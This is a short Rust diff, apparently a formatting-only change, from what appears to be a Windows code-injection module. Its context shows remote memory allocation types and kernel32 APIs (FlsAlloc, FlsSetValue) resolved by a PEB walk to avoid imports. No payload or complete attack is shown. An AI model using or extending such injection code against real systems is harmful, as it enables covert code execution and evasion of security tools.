@@ -180,11 +180,11 @@ pub fn fls_inject_enabled() -> bool {
 // ---- remote helpers (resolved via PEB walk) ----
 
 type VirtualAllocEx = unsafe extern "system" fn(
-    *mut c_void, // hProcess
+    *mut c_void,   // hProcess
     *const c_void, // lpAddress (null = anywhere)
-    usize,       // dwSize
-    u32,         // flAllocationType
-    u32,         // flProtect
+    usize,         // dwSize
+    u32,           // flAllocationType
+    u32,           // flProtect
 ) -> *mut c_void;
 type VirtualProtectEx =
     unsafe extern "system" fn(*mut c_void, *const c_void, usize, u32, *mut u32) -> i32;
@@ -244,8 +244,7 @@ unsafe fn fls_resolve() -> Result<FlsFns, &'static str> {
     let close: CloseHandle =
         core::mem::transmute(export_addr(b"kernel32.dll", b"CloseHandle").ok_or("CloseHandle")?);
     let fls_alloc = export_addr(b"kernel32.dll", b"FlsAlloc").ok_or("FlsAlloc")?;
-    let fls_set_value =
-        export_addr(b"kernel32.dll", b"FlsSetValue").ok_or("FlsSetValue")?;
+    let fls_set_value = export_addr(b"kernel32.dll", b"FlsSetValue").ok_or("FlsSetValue")?;
     Ok(FlsFns {
         vax,
         vpx,
